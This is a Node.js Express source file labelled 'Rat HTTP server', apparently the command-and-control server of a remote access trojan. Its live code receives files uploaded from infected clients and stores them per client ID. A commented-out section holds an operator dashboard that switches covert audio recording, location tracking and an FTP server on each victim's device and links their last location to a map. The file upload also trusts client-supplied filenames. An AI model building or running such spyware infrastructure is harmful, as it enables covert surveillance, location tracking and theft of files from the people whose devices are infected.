/*
 * Rat HTTP server
 */

var express = require('express');
var path = require('path');
var mongoose = require('mongoose');
var morgan = require('morgan');
var multer = require('multer');
var mkdirp = require('mkdirp');

var storage = multer.diskStorage({
    destination: function(req, file, cb) {
        // For use with the java rat server we... located in the parent directory
        // Thus we use /../ and save in the client id's directory
        var directory = path.join(__dirname, '/../', req.params.clientId);
        // Ensure dir exists, it probabaly already exists when using java rat server
        mkdirp.sync(directory);
        cb(null, directory);
    },
    filename: function(req, file, cb) {
        // Save the file with the name it had on the client side
        cb(null, file.originalname);
    }
});
var upload = multer({
    storage: storage,
    limits: {
        // Filesize in bytes
        fileSize: 128 * 1024 * 1024
    }
    // The file identifier expected for the client, thes must match
}).single('tehAwesomeFile');

var app = express();
var PORT_NUMBER = process.argv[2]; // to start: "node server.js [port]"

// Simple connection logger
app.use(morgan(':date[clf] :remote-addr :url'));

/*
 * A client is uploading a file
 */
app.post('/postFile/:clientId', (req, res) => {
        upload(req, res, (err) => {
            if (err) {
                console.log('Error receiving from %s: %s', req.params.clientId, req.file.originalname);
                res.send("Error: " + err);
            }
            console.log('Success receiving from %s: %s', req.params.clientId, req.file.originalname);
            res.send("Received: " + req.file.originalname);
        });
    });

/*
 * app.post('/handshake/:id/:version/:package/:ssid/:isAudioStarted/:isLocationStarted/:ftpServerStarted/:location',
 *     function(req, res) {
 *
 *         connectionManager.add(req.params.id, req.params.isLocationStarted,
 *             req.params.isAudioStarted, req.params.ftpServerStarted,
 *             req.params.location);
 *
 *         var connection = connectionManager.getLastById(req.params.id);
 *         var actions = {
 *             startAudio: connection.audio,
 *             startLocation: connection.locationStarted,
 *             startFTPServer: connection.ftpServ
 *         };
 *
 *         res.send(actions);
 *     });
 *
 * app.get('/dashboard', function(req, res) {
 *     var head = "<html> <head> </head> <body> ";
 *     var content = "";
 *     var script = "";
 *     script += "<script>";
 *     script += "setInterval(function() {location.reload();}, 5000);";
 *     script += "</script>";
 *     var connections = connectionManager.connections;
 *     for (var i = 0; i < connections.length; i++) {
 *         // first link to detail view
 *         content += "\r\n<p><a href=\"";
 *         content += "/detailView/";
 *         content += connections[i].id;
 *         content += "\">";
 *         content += connections[i].id;
 *         content += " " + connections[i].age;
 *         content += "</a>";
 *         // link to start stop location
 *         content += " " + "location started: ";
 *         content += "<a href=\"";
 *         content += "/toggleLocation/";
 *         content += connections[i].id;
 *         content += "\">";
 *         content += " " + connections[i].locationStarted;
 *         content += "</a>";
 *         // link to start stop audio
 *         content += " " + "audio started: ";
 *         content += "<a href=\"";
 *         content += "/toggleAudio/";
 *         content += connections[i].id;
 *         content += "\">";
 *         content += " " + connections[i].audio;
 *         content += "</a>";
 *         // link to start stop ftp server
 *         content += " " + "ftpServer started: ";
 *         content += "<a href=\"";
 *         content += "/toggleFtpServer/";
 *         content += connections[i].id;
 *         content += "\">";
 *         content += " " + connections[i].ftpServ;
 *         content += "</a>";
 *         content += " " + "last location: ";
 *         content += "<a target=\"_blank\" href=\"";
 *         content += "http://maps.google.com/maps?q=loc:";
 *         content += connections[i].location;
 *         content += "\">";
 *         content += " " + connections[i].location;
 *         content += "</a>";
 *     }
 *     var foot = "\r\n</body> </html>";
 *     var page = head + content + script + foot;
 *     res.send(page);
 * });
 *
 * app.get('/detailView/:id', function(req, res) {
 *     var head = "<html> <head> </head> <body> ";
 *     var connection = connectionManager.getLastById(req.params.id);
 *     var content = connection;
 *     var foot = "\r\n</body> </html>";
 *     var page = head + content + foot;
 *     res.send(page);
 * });
 *
 * app.get('/toggleFtpServer/:id', function(req, res) {
 *     var connection = connectionManager.getLastById(req.params.id);
 *     if (connection.ftpServ === true || connection.ftpServ === "true") {
 *         connection.ftpServ = false;
 *     } else {
 *         connection.ftpServ = true;
 *     }
 *     res.redirect('/dashboard');
 * });
 *
 * app.get('/toggleLocation/:id', function(req, res) {
 *     var connection = connectionManager.getLastById(req.params.id);
 *     if (connection.locationStarted === true || connection.locationStarted === "true") {
 *         connection.locationStarted = false;
 *     } else {
 *         connection.locationStarted = true;
 *     }
 *     res.redirect('/dashboard');
 * });
 *
 * app.get('/toggleAudio/:id', function(req, res) {
 *     var connection = connectionManager.getLastById(req.params.id);
 *     if (connection.audio === true || connection.audio === "true") {
 *         connection.audio = false;
 *     } else {
 *         connection.audio = true;
 *     }
 *     res.redirect('/dashboard');
 * });
 *
 * var connectionManager = {
 *     connections: [],
 *     add: function(id, locationStarted, audio, ftpServ, location) {
 *         if (this.getLastById(id) === undefined) {
 *             this.connections.push({
 *                 id: id,
 *                 age: Date.now(),
 *                 locationStarted: locationStarted,
 *                 audio: audio,
 *                 ftpServ: ftpServ,
 *                 location: location
 *             });
 *         } else {
 *             this.getLastById(id).age = Date.now();
 *             this.getLastById(id).location = location;
 *         }
 *         this.clean();
 *     },
 *     clean: function() {
 *         var timeout = 60000;
 *         for (var i = 0; i < this.connections.length; i++) {
 *             var count = 0;
 *             if (this.connections[i].age < (Date.now() - timeout)) {
 *                 var index = this.connections.indexOf(this.connections[i]);
 *                 this.connections.splice(index, 1);
 *                 count++;
 *             }
 *         }
 *     },
 *     getLastById: function(id) {
 *         for (var i = this.connections.length - 1; i >= 0; i--) {
 *             if (this.connections[i].id === id) {
 *                 return this.connections[i];
 *             }
 *         }
 *     }
 * };
 */

// start the server
var server = app.listen(PORT_NUMBER, function() {
    var host = server.address().address;
    var port = server.address().port;

    console.log('listening at %s:%s', host, port);
});
